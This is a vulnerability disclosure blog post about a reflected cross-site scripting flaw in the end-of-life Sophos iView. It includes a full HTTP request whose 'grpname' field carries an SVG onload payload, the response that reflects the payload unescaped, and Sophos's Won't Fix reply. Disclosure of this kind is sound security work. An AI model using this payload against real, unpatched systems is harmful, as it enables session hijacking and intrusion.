---
layout: post
title:  "Reflected Cross-Site scripting in Sophos iView"
date:   2023-04-30 19:51:02 +0700 
categories: [cve]
---

Vendor: Sophos

Product: Sophos iView (The EOL was December 31st 2020)

#### Product description:

Reflected XSS in the privileged user area, where i was able to set parameter 'json->"grpname"'s value to 'ww;</script>/</script/>/<svg/onload=alert('Sophos') width=100//>'

That successfully embedded a script in the response, which was executed when the page loads in the user's browser.

* CVE ID: awaiting
* CWE ID: CWE-79

#### #Proof of Concept

Reflected cross-site scripting (XSS) vulnerability was discovered in the product.

A cross-site scripting vulnerability was identified.

It was possible to inject malicious code, I've successfully embedded a script in the response, which allowed me to execute it when the page loaded in the browser.

The following Proof of Concept (PoC) demonstrates the attack as well as displaying evidence of the script payload being returned in the response. 

#### PoC:
{% highlight ruby %}
POST /iview
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Referer: https://10.0.0.112/webpages/index.jsp?empty=1_1&watermarkmsg=0
Cookie: JSESSIONID=189B80C28A886E98BBD17B7AEFF1B63C
Connection: Keep-Alive
Host: 10.0.0.112
X-Requested-With: XMLHttpRequest
Content-Length: 170
Cache-Control: no-cache
Accept: text/plain, */*; q=0.01
Accept-Language: en-US
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

mode=28&deviceprofile=123&json={"selecteddevices":"1","grpname":"ww;</script>/</script/>/<svg/onload=alert('Sophos') width=100//>","description":"www"}&__RequestType=ajax

HTTP/1.1 200 200
Connection: Keep-Alive
Server: xxxx
Content-Length: 173
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=5, max=100
Cache-Control: max-age=2592000
Strict-Transport-Security: max-age=31536000; includeSubDomains
Date: Thu, 09 Jan 2020 14:54:39 GMT
Expires: Sat, 08 Feb 2020 14:54:39 GMT

{"reurl":"managedevicegroup.html?action=71020","message":"Device Group ww;<\/script>/<\/script/>/<svg/onload=alert('Sophos') width=100//> is already exists.","status":"500"}
{% endhighlight %}


Reply from Sophos via Bugcrowd:

"We are divesting the Sophos iView product, meaning that this particular vulnerability is accepted business risk. I will close this issue as Won't Fix"

#### References:
1. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
2. https://www.firewalls.com/pub/media/wysiwyg/datasheets/Sophos/iView.pdf
3. https://vimeo.com/107872566
4. https://docs.sophos.com/nsg/sophos-iview/v03012/Help/en-us/webhelp/onlinehelp/index.html#page/onlinehelp/AccessDevice.html
